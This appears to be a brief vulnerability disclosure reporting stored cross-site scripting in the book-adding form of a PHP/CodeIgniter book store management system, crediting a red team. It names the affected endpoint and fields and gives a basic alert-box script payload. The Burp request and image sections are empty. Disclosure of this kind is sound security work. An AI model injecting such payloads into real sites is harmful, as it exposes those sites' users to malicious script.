# Stored Cross Site Scripting

Discoverer(s)/Credits: CMCSOC Redteam (@lithonn)

- Ngo Van Tu (@leecybersec)
- Tran Thi Nho (@nhott)
- Huynh Nhat Hao (@h40huynh)
- Le Thi Huyen My (@Huy3nMy)

The product(s): https://www.sourcecodester.com/php/15748/book-store-management-system-project-using-php-codeigniter-3-free-source-code.html

Affected product(s)/code base: https://www.sourcecodester.com/sites/default/files/download/oretnom23/bsms_ci.zip

Affected component(s): /bsms_ci/index.php/book/add

Proof of Concept: Go to /bsms_ci/index.php/book/add and using function “Add New Book” and insert payload at “Book Title", "Publisher" or "Author”.

[+] Payload: `<script>alert(document.domain)</script>`

Burpsuite Request:

``` txt

```

Image:

![image](link)